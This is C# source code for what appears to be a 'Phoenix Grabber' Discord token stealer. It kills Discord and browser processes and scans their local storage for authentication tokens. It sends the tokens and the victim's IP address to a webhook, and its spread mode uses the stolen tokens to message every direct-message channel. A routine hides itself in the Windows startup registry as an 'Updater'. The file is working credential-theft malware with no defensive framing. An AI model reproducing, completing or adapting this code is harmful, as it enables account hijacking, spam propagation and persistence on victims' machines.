using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using System.Web.Script.Serialization;

namespace Program
{
    static class Program
    {
        #region Main
        static void Main()
        {
            Start();
            //SpreadMode
            //RunOnStartup
            //FakeError
        }
        #endregion

        #region Start
        static List<string> tokens = new List<string>();

        static void Start()
        {
            string[] processlist = { "Discord", "DiscordCanary", "DiscordPTB", "Lightcord", "opera", "operagx", "chrome", "chromesxs", "Yandex", "msedge", "brave", "vivaldi", "epic" };
            foreach (Process process in Process.GetProcesses())
            {
                foreach (var name in processlist)
                {
                    if (process.ProcessName == name)
                        process.Kill();
                }
            }
            List<string> locations = new List<string>();
            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            locations.Add(appdata + "\\discord\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\discordcanary\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\discordptb\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\Lightcord\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\Mozilla\\Firefox\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default");
            locations.Add(localappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
            locations.Add(localappdata + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\");
            foreach (var path in locations)
            {
                if (!Directory.Exists(path)) continue;
                foreach (var file in new DirectoryInfo(path).GetFiles())
                {
                    if (file.Equals("LOCK")) continue;
                    foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27,}|mfa\\.[\\w-]{84}"))
                    {
                        if (!tokens.Contains(match.Value))
                            tokens.Add(match.Value);
                    }
                }
            }
            var result = string.Join("\\n", tokens.ToArray());
            if (string.IsNullOrEmpty(result))
                result = "N/A";
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebRequest request = WebRequest.Create("Webhook");
            request.Method = "POST";
            request.ContentType = "application/json";
            using (var stream = new StreamWriter(request.GetRequestStream()))
                stream.Write("{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | github.com/extatent\"},\"title\":\"Phoenix Grabber\",\"fields\":[{\"inline\":true,\"name\":\"IP Address:\",\"value\":\"" + IP() + "\"},{\"inline\":false,\"name\":\"Tokens:\",\"value\":\"```\\n" + result + "\\n```\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
            request.GetResponse();
            request.Abort();
        }
        #endregion

        #region Spread Mode
        static void SpreadMode(string message)
        {
            foreach (var token in tokens)
            {
                try
                {
                    string text;
                    ServicePointManager.Expect100Continue = true;
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                    WebRequest request = WebRequest.Create("https://discord.com/api/v10/users/@me/channels");
                    request.Headers.Add("Authorization", token);
                    request.Method = "GET";
                    request.ContentLength = 0;
                    using (var stream = new StreamReader(request.GetResponse().GetResponseStream()))
                    {
                        text = stream.ReadToEnd();
                        stream.Dispose();
                    }
                    request.Abort();
                    var serializer = new JavaScriptSerializer();
                    dynamic array = serializer.DeserializeObject(text);
                    foreach (dynamic entry in array)
                    {
                        WebRequest request2 = WebRequest.Create("https://discord.com/api/v10/channels/" + entry["id"] + "/messages");
                        request2.Headers.Add("Authorization", token);
                        request2.Method = "POST";
                        request2.ContentType = "application/json";
                        using (var stream = new StreamWriter(request2.GetRequestStream()))
                            stream.Write("{\"content\":\"" + message + "\"}");
                        try
                        {
                            using (var stream = new StreamReader(request2.GetResponse().GetResponseStream()))
                            {
                                text = stream.ReadToEnd();
                                stream.Dispose();
                            }
                        }
                        catch { }
                        request2.Abort();
                        Thread.Sleep(200);
                    }
                }
                catch { }
            }
        }
        #endregion

        #region IP Address
        static string IP()
        {
            string IP;
            try { IP = new WebClient() { Proxy = null }.DownloadString("http://icanhazip.com/").Trim(); } catch { IP = "N/A"; }
            return IP;
        }
        #endregion

        #region Run On Startup
        static void RunOnStartup()
        {
            try { RegistryKey startup = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true); startup.SetValue("Updater", Assembly.GetExecutingAssembly().Location); } catch { }
        }
        #endregion
    }
}